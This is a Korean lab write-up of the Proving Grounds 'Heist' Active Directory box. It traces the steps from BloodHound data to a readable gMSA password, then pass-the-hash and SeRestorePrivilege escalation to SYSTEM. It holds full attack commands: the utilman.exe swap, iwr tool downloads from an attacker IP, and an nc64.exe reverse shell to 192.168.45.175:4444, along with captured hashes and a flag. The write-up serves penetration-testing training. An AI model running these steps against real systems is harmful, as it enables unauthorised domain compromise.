![[Pasted image 20260708144718.png]]

**`svc_apache$` — 이름 끝의 `$` 가 전부를 말함.** 컴퓨터 계정 아니면 (g)MSA 임. `C:\Users` 에 프로필이 있으니 로그온한 적이 있는 서비스 계정임.

**BloodHound 수집**

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ bloodhound-python -u enox -p california -d Heist.offsec -ns 192.168.120.165 -c All
```

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-ns 192.168.120.165` | DNS 서버를 DC 로 지정 | Kali 의 `/etc/resolv.conf` 는 `heist.offsec` 을 모름. LDAP 연결 단계에서 이름 해석 실패 |
| `-c All` | 모든 수집기 | 기본값은 일부만 돎. ACL 엣지(`ReadGMSAPassword` 포함)를 놓침 |
| `-d Heist.offsec` | 도메인 | FQDN 이어야 함 |

수집 시각이 파일명에 박힘 — `20260708141821_*.json` 은 14:18:21 의 스냅샷임. **그 뒤에 바뀐 것은 그래프에 없고, URA·로컬 특권은 애초에 수집 대상이 아님.** 이 박스의 결정타 `SeRestorePrivilege` 가 그래프에 없는 이유임.

**gMSA 위치 확인**

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | select(.Properties.name=="SVC_APACHE$@HEIST.OFFSEC") | .Properties.distinguishedname' 20260708141821_users.json
CN=SVC_APACHE,CN=MANAGED SERVICE ACCOUNTS,DC=HEIST,DC=OFFSEC
```

**`CN=Managed Service Accounts`** — 이 컨테이너에 있으면 gMSA 임. 비밀번호를 관리자가 정하지 않고 DC 가 KDS root key 에서 파생해 기본 30일마다 자동 롤함. 즉 **크랙할 수 없지만 읽을 수는 있는 계정**이라, 크랙을 포기하고 ACL 을 봐야 한다는 신호임.

**누가 읽을 수 있는가 — 원본 JSON 의 ACE**

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | select(.Properties.name=="SVC_APACHE$@HEIST.OFFSEC")
           | .Aces[] | select(.RightName=="ReadGMSAPassword")
           | [.RightName,.PrincipalSID,.PrincipalType,.IsInherited] | @tsv' 20260708141821_users.json
ReadGMSAPassword	HEIST.OFFSEC-S-1-5-32-544	Group	false
ReadGMSAPassword	S-1-5-21-537427935-490066102-1511301751-1000	Computer	false
ReadGMSAPassword	S-1-5-21-537427935-490066102-1511301751-1104	Group	false
```

principal 셋 중 둘은 기본값임 — `S-1-5-32-544` 는 `BUILTIN\Administrators`, `-1000` 은 `DC01.HEIST.OFFSEC` 자신(컴퓨터 계정, `computers.json` 에서 SID 확인). 남는 `-1104` 가 공격 경로임:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | select(.ObjectIdentifier=="S-1-5-21-537427935-490066102-1511301751-1104")
           | [.Properties.name, (.Members[].ObjectIdentifier)] | @tsv' 20260708141821_groups.json
WEB ADMINS@HEIST.OFFSEC	S-1-5-21-537427935-490066102-1511301751-1103

┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | select(.ObjectIdentifier=="S-1-5-21-537427935-490066102-1511301751-1103")
           | [.Properties.samaccountname, .Properties.distinguishedname] | @tsv' 20260708141821_users.json
enox	CN=NAQI,CN=USERS,DC=HEIST,DC=OFFSEC
```

**`WEB ADMINS` 의 유일한 멤버가 `enox`.** 경로가 확정됨:

```text
ENOX  --MemberOf-->  WEB ADMINS  --ReadGMSAPassword-->  SVC_APACHE$
```

![[Pasted image 20260708150543.png]]

> [!warning] `CN=NAQI` — DN 의 CN 과 `sAMAccountName` 은 다를 수 있음
> 이 계정의 DN 은 `CN=NAQI` 인데 실제 로그인 이름은 `enox` 임. **인증에 쓰는 것은 `sAMAccountName`.** `ldapsearch`·`net rpc`·수동 열거로 사용자 목록을 뽑을 때 CN 만 긁으면 로그인이 전부 실패함.

`enox` 와 `svc_apache$` 가 둘 다 WinRM 으로 들어가는 근거도 JSON 에 있음:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | select(.Properties.name=="REMOTE MANAGEMENT USERS@HEIST.OFFSEC")
           | .Members[].ObjectIdentifier' 20260708141821_groups.json
S-1-5-21-537427935-490066102-1511301751-1105
S-1-5-21-537427935-490066102-1511301751-1103
```

`-1103`(enox)·`-1105`(svc_apache$) 둘 다 `Remote Management Users` 임.

**gMSA 비밀번호 읽기 — 방법 1: Kali 에서 `bloodyAD` LDAP 직접 조회 (권장)**

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ bloodyAD --host 192.168.120.165 -d heist.offsec -u enox -p california get object 'svc_apache$' --attr msDS-ManagedPassword

distinguishedName: CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:76a431e264ca606c0ade543f59b7a470
msDS-ManagedPassword.B64ENCODED: bZWXotad8olrCM62+lM8Gm2/91Dy7WKBUKgAVwec1REk/1O4KTfQJSas94jwsyFH1FrT37sSZ9vlyXGN1oGRZNdS/oJSCWog+t8ViAiQKHHCqz3lodTwCCRIOd6yyeXpHqPB1/S+mIMXo+eyZL+uC/lIOk0uZWFPzKhwzNCNedjG90f6sz7RBsMiUO/LYK9dCbKKvhzzpGlFKSYk8H0rnIPMM8I2ycz8h1EJl/YwSjqMfi1IAz6JZIB28xJ1Vr4e6UPA1chwbeG+1by28v5VrL9dqlZWe9UYj3YVxdfv7E5sNGqfLCOW3ZQQaQVgbV/+Oul8t2KlfCMIpKhaMbjjKA==
```

| 조각 | 역할 |
|---|---|
| `get object 'svc_apache$'` | LDAP 객체 하나를 조회. `$` 는 반드시 작은따옴표 안에 — bash 에서 변수 확장으로 먹힘 |
| `--attr msDS-ManagedPassword` | 계산된(constructed) 속성 하나만 요청. 디스크에 저장돼 있는 것이 아니라 DC 가 요청 시점에 만들어 줌 |
| `-d heist.offsec` | FQDN |
| 출력 `.NTLM:` | bloodyAD 가 blob 에서 현재 비밀번호를 꺼내 NT 해시로 미리 계산해 줌. `aad3b4...` 는 빈 LM 해시 |

**NT 해시 `76a431e264ca606c0ade543f59b7a470` — 이것이 곧 자격증명임.** 평문은 120자 랜덤이라 크랙할 이유가 없고, PtH 에는 NT 해시만 있으면 됨.

**방법 2 — 타겟에서 `GMSAPasswordReader.exe` (평문·Kerberos 키까지 필요할 때)**

```powershell
*Evil-WinRM* PS C:\Users\enox\Documents> iwr 192.168.45.175/GMSAPasswordReader.exe -o reader.exe
*Evil-WinRM* PS C:\Users\enox\Documents> .\reader.exe --accountname svc_apache
Calculating hashes for Old Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : AD580D1BA99F2167B14EC7DB4D3E0F9C
[*]       aes128_cts_hmac_sha1 : 948AC08EE52E117368FD6E2CEC771D83
[*]       aes256_cts_hmac_sha1 : 031595195375D0FE66DF2783398C289629BA1243604BA2EEC6EA3ABEDCF2C819
[*]       des_cbc_md5          : E9B368D308FBDC58

Calculating hashes for Current Value
[*] Input username             : svc_apache$
[*] Input domain               : HEIST.OFFSEC
[*] Salt                       : HEIST.OFFSECsvc_apache$
[*]       rc4_hmac             : 76A431E264CA606C0ADE543F59B7A470
[*]       aes128_cts_hmac_sha1 : B7DB7F6148D4DD3C7B101F7C1F846CDE
[*]       aes256_cts_hmac_sha1 : 7D529FCF364669301FA43E8040F5655F459D39847A305BA76BC8040C0B94217D
[*]       des_cbc_md5          : 83E6F249922FE04C
```

`Old Value` / `Current Value` 두 벌이 나오는 이유 — gMSA blob 에는 이전 비밀번호와 현재 비밀번호가 함께 들어 있음. 롤 직후 아직 갱신을 못 받은 클라이언트가 인증할 수 있게 하는 유예 장치임. **써야 하는 것은 `Current Value`** 이고, 그 값이 방법 1 의 `bloodyAD` 결과와 글자 단위로 일치함 — 서로 다른 도구·경로에서 나온 독립 근거 2개로 교차 검증됨.

`rc4_hmac` 은 NT 해시와 같은 값임(Kerberos etype 23 이 NT 해시를 키로 씀). 그래서 이 한 값이 PtH 에도, `-k` Kerberos 인증에도 쓰임.

| | bloodyAD (Kali) | GMSAPasswordReader (타겟) |
|---|---|---|
| 파일 업로드 | 불필요 | 필요 — AV·EDR 위험 |
| 얻는 것 | NT 해시 + base64 blob | NT 해시 + AES128/256 Kerberos 키 |
| 언제 | 기본 | AES 만 허용된 도메인(RC4 비활성)에서 Kerberos 를 써야 할 때 |

**Pass-the-Hash 로 `svc_apache$` 셸**

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ evil-winrm -i 192.168.120.165 -u 'svc_apache$' -H '76A431E264CA606C0ADE543F59B7A470'

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

`-H` 가 PtH 임 — NTLM 인증의 입력은 비밀번호가 아니라 NT 해시라 해시만 있으면 평문 없이 인증이 성립함. `-H` 에는 NT 해시만 넣음(`LM:NT` 전체 형식도 대부분의 도구가 받으나 evil-winrm 에는 NT 부분만 주는 것이 안전함). ⚠️ Kerberos 에는 PtH 가 통하지 않음 — NT 해시를 RC4 키로 쓰는 Overpass-the-Hash(`impacket-getTGT -hashes :<NT>`)로 가야 함.

**`SeRestorePrivilege` Enabled — 여기가 결승선임.** 특권은 4개뿐이고 `SeImpersonatePrivilege` 가 없어 [[Squid]] 에서 쓴 Potato 계열은 여기서 안 통함.

이 특권이 어디서 왔는지는 그래프로 알 수 없음 `[가정]`. 보통 출처인 두 그룹은 멤버가 0명임:

```bash
┌──(kali㉿kali)-[~/PG/Heist]
└─$ jq -r '.data[] | select(.Properties.name|test("^(BACKUP|SERVER) OPERATORS@")) | [.Properties.name, ((.Members//[])|length)] | @tsv' 20260708141821_groups.json
SERVER OPERATORS@HEIST.OFFSEC	0
BACKUP OPERATORS@HEIST.OFFSEC	0
```

그러므로 이 특권은 그룹이 아니라 **User Rights Assignment(로컬 보안 정책 / GPO)로 계정에 직접 부여**된 것으로 봄 `[가정]`. **BloodHound 는 URA 를 수집하지 않음** — 이 박스의 권한상승은 그래프가 아니라 `whoami /priv` 한 줄에서 나왔음.

**경로 A(본선) — `utilman.exe` 치환 + RDP**

```powershell
*Evil-WinRM* PS C:\Users\svc_apache$\Documents> cd c:\
*Evil-WinRM* PS C:\> cd windows
*Evil-WinRM* PS C:\windows> cd system32
*Evil-WinRM* PS C:\windows\system32> ren utilman.exe utilman.old
*Evil-WinRM* PS C:\windows\system32> ren cmd.exe Utilman.exe
```

![[Pasted image 20260708152930.png]]

**순서가 중요함.** 원본을 먼저 치워야(`utilman.old`) 이름 충돌 없이 `cmd.exe` 를 그 자리에 놓을 수 있음. 오류 없이 두 줄이 통과했다는 것 자체가 **`SeRestorePrivilege` 가 DACL 을 우회했다는 증거**임 — 일반 사용자는 `System32` 에 이름변경을 못 함.

```bash
┌──(kali㉿kali)-[~]
└─$ xfreerdp3 /v:192.168.120.165 /cert:ignore /sec:tls
```

| 플래그 | 역할 | 빼면 |
|---|---|---|
| 자격증명 없음 | 로그인 화면까지만 감 | 이 트릭은 로그인 «전» 화면이 목적이라 `/u:` 가 필요 없음 |
| `/cert:ignore` | 자가서명 인증서 경고 무시 | 대화형 승인 프롬프트에서 멈춤 |
| `/sec:tls` | 보안 프로토콜을 TLS 로 고정 | NLA 협상으로 빠지면 자격증명을 먼저 요구해 로그인 화면에 도달 못 함 |

로그인 화면에서 Win+U(접근성)를 누르면 `Utilman.exe`(=`cmd.exe`)가 SYSTEM 으로 뜸:

```text
The system cannot find message text for message number 0x2350 in the message file for Application.

(c) 2018 Microsoft Corporation. All rights reserved.
Not enough memory resources are available to process this command.

C:\Windows\system32>.\Utilman.exe
The system cannot find message text for message number 0x2350 in the message file for Application.

(c) 2018 Microsoft Corporation. All rights reserved.
Not enough memory resources are available to process this command.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>type c:\users\administrator\desktop\proof.txt
b041c78918d81a4a4a15732053a1e416

C:\Windows\system32>
```
— 출처: `파일보관\Pasted image 20260708153113.png` (RDP 세션 화면 전사)

![[Pasted image 20260708153113.png]]

콘솔 제목이 `Select C:\Windows\system32\utilman.exe - .\Utilman.exe` 로 뜨고 배너 자리에 `The system cannot find message text for message number 0x2350` · `Not enough memory resources are available to process this command.` 가 찍힘 — 이름을 바꾼 `cmd.exe` 가 자기 메시지 리소스를 자기 파일명으로 못 찾아 생기는 표시임 `[가정]`. **오류처럼 보이나 셸은 정상 동작함** — 같은 화면의 `whoami` 가 `nt authority\system` 이고 `proof.txt` 가 그대로 읽힘.

> [!danger] 끝나면 되돌릴 것
> ```powershell
> ren Utilman.exe cmd.exe
> ren utilman.old utilman.exe
> ```
> 되돌리지 않으면 다음 사람(또는 재부팅 후의 나)이 로그인 화면에서 접근성 기능을 잃음. 시험은 리버트 후 재현을 요구하므로 원복 절차까지가 한 세트임.

**경로 B(대안) — `SeRestoreAbuse.exe` + 리버스셸**

파일이 아니라 레지스트리를 노림. 같은 세션에서 이 경로도 끝까지 실행해 SYSTEM 을 재확인했음. 업로드 두 개:

```powershell
*Evil-WinRM* PS C:\users\svc_apache$\desktop> iwr 192.168.45.175/SeRestoreAbuse.exe -o SeRestoreAbuse.exe
*Evil-WinRM* PS C:\users\svc_apache$\desktop> iwr 192.168.45.175/nc64.exe -o nc64.exe
```

![[Pasted image 20260708155147.png]]

```powershell
*Evil-WinRM* PS C:\users\svc_apache$\desktop> .\SeRestoreAbuse.exe "C:\users\svc_apache$\desktop\nc64.exe 192.168.45.175 4444 -e powershell.exe"
Start-Service seclogon
RegCreateKeyExA result: 0
RegSetValueExA result: 0
```

![[Pasted image 20260708155102.png]]

출력을 읽는 법 — `RegCreateKeyExA result: 0` / `RegSetValueExA result: 0`. Win32 에서 **0 = `ERROR_SUCCESS`** 임. 레지스트리 키 생성·값 설정이 둘 다 성공했다는 뜻이고, 이 쓰기가 통한 이유가 `SeRestorePrivilege` 임.

함께 찍힌 `Start-Service seclogon` 은 다음에 칠 명령을 알려주는 안내 문자열임. 즉 이 도구는 `seclogon`(Secondary Logon) 서비스의 실행 경로를 내 명령으로 바꿔놓고 그 서비스를 시작하라고 요구함. 서비스는 LocalSystem 으로 뜨므로 페이로드가 SYSTEM 으로 실행됨. ⚠️ Kali 에는 컴파일된 `.exe` 만 있고 소스가 없어(`~/git/SeRestoreAbuse/SeRestoreAbuse.exe`) 어느 레지스트리 키를 정확히 쓰는지는 확인하지 못했음 `[가정]`.

```bash
┌──(kali㉿kali)-[~]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.175] from (UNKNOWN) [192.168.120.165] 50227
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> type c:\users\administrator\desktop\proof.txt
type c:\users\administrator\desktop\proof.txt
b041c78918d81a4a4a15732053a1e416
PS C:\Windows\system32>
```

![[Pasted image 20260708155109.png]]

**두 경로 우열**

| | A: utilman + RDP | B: SeRestoreAbuse + nc |
|---|---|---|
| 전제조건 | `nla:False` · RDP 3389 열림 | 없음 (WinRM 만 있으면 됨) |
| 업로드 | 없음 | 2개(`SeRestoreAbuse.exe`·`nc64.exe`) — AV 위험 |
| 남기는 흔적 | 시스템 파일 2개 이름변경 — 원복 필수 | 서비스 설정 변경 — 원복 권장 |
| 셸 품질 | GUI 콘솔(붙여넣기 불편) | `rlwrap` 리버스셸 — 스크립트하기 좋음 |
| 안정성 | 화면 조작이라 실패해도 즉시 앎 | 서비스 시작 타이밍에 의존 |

**시험이라면 A 를 먼저 시도할 것** — 업로드가 없어 AV 를 건드리지 않고 실패 판정이 즉각적임. `nla:True` 이거나 3389 가 막혀 있으면 B 로 감.

### Post-Exploitation

**Proof.txt value:**

`b041c78918d81a4a4a15732053a1e416`

경로 A 의 SYSTEM 콘솔에서 `whoami`(→ `nt authority\system`)와 `type c:\users\administrator\desktop\proof.txt` 가 **한 화면에** 담김(`파일보관\Pasted image 20260708153113.png`). 경로 B 의 리버스셸에서도 같은 값을 재확인했음. 둘 다 대화형 셸이라 시험 규정상 유효한 획득 방식임.

**남긴 흔적** — 인스턴스는 Stop 하면 파괴되므로 원복 대상이 아니라 공격 경로의 일부로 기록함.

- `C:\Windows\System32\utilman.exe` → `cmd.exe` 로 치환, 원본은 `utilman.old`
- `C:\Users\enox\Documents\reader.exe` (GMSAPasswordReader)
- `C:\Users\svc_apache$\Desktop\SeRestoreAbuse.exe` · `nc64.exe`
- `seclogon` 서비스 설정 변경 (SeRestoreAbuse 가 남긴 레지스트리)
- 계정 생성·비밀번호 변경 없음
- Kali 산출물 `~/PG/Heist/` — `nmap.log` · `hash.txt` · BloodHound JSON 7종 · feroxbuster `.state`

## 관련

- **CVE 없음** — 취약한 소프트웨어 버전이 아니라 설정과 ACL 만으로 뚫림. 그래서 `cves: []` · `manual_cves: true`
- [MS-NLMP: NTLM 인증 프로토콜](https://learn.microsoft.com/openspecs/windows_protocols/ms-nlmp/) — NetNTLMv2 blob·AV_PAIR 구조
- [MS-GKDI / gMSA 개요](https://learn.microsoft.com/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview) — `msDS-ManagedPassword`·KDS root key
- [Responder](https://github.com/lgandx/Responder) · [ntlm_theft](https://github.com/Greenwolf/ntlm_theft) (SMB 트리거는 [[Vault]])
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) · [BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) — 이 박스에서는 `~/git/Toolies/` 의 컴파일본 사용
- [SeRestoreAbuse](https://github.com/xct/SeRestoreAbuse) `[가정]` — Kali 에는 [Compiled-Binaries](https://github.com/AlexLinov/Compiled-Binaries) 저장소의 `.exe` 만 있어 원 저장소를 대조하지 못했음
- [hashcat 모드 목록](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [OSCP Exam Guide — Exam Proofs](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) — 웹셸 플래그 0점 규정
- [[Vault]] — 같은 세션에 푼 자매 박스. 같은 NetNTLMv2 캡처 → 크랙 → WinRM → `SeRestorePrivilege` 구조인데 **트리거가 SMB(`cifs/...`)이고 권한상승이 GPO ACL** 임
- [[Butch]] — 웹셸로 읽은 플래그는 0점이라는 규정의 근거
- [[Squid]] — `SeImpersonatePrivilege` → Potato. **이 박스에는 그 특권이 없어 다른 길로 감**
- [[Resourced]] — AD·Kerberos 시계 동기와 ccache 취급
- [[Nagoya]] — 같은 세션의 다른 AD 박스. 티켓 위조(`impacket-ticketer`)·`net rpc password` 사례
- [[Hutch]] — AD 열거·ACL 악용 계열
- [[Exghost]] — 워드리스트에 없는 이름은 브루트포싱으로 못 찾음
- [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] · [[_PLAYBOOK#A-23. 워드리스트에 없는 파일명은 브루트포싱으로 못 찾는다]] · [[_PLAYBOOK#A-51. AD 박스에서 막히면 «취약점»이 아니라 넷을 먼저 본다]] · [[_PLAYBOOK#A-64. 사후에 시간 서사를 복원하는 법 — mtime + 스크린샷 파일명]]
- [[_PLAYBOOK#B-42. 특권은 "없는" 게 아니라 "박탈된" 것일 수 있다]] · [[_PLAYBOOK#B-53. 유효한 도메인 자격증명 «하나»를 얻으면 즉시 BloodHound를 돌린다]] · [[_PLAYBOOK#B-66. 해시 접두어로 포맷을 즉시 판별한다]]
- [[_PLAYBOOK#A-54. 강제 인증 해시는 잡았는데 릴레이가 안 통한다 — 릴레이 가능 여부는 3초에 판정한다]] · [[_PLAYBOOK#A-4-17. Windows 셸을 잡았는데 어느 특권을 써야 할지 모르겠다 — 던지기 전에 3초·10초 판정으로 후보를 지운다]]
- [[_PLAYBOOK#B-47. SeRestorePrivilege — SYSTEM 으로 가는 두 갈래(파일 / 레지스트리)와 그 전제조건]] · [[_PLAYBOOK#B-59. gMSA — 크랙할 수 없지만 읽을 수는 있는 계정]] · [[_PLAYBOOK#B-57. 쓰기 가능한 SMB 공유는 저장소가 아니라 «자격증명 덫»이다 — 강제 인증]]
- [[_WRITEUP-STANDARD]] · [[_STATUS]]
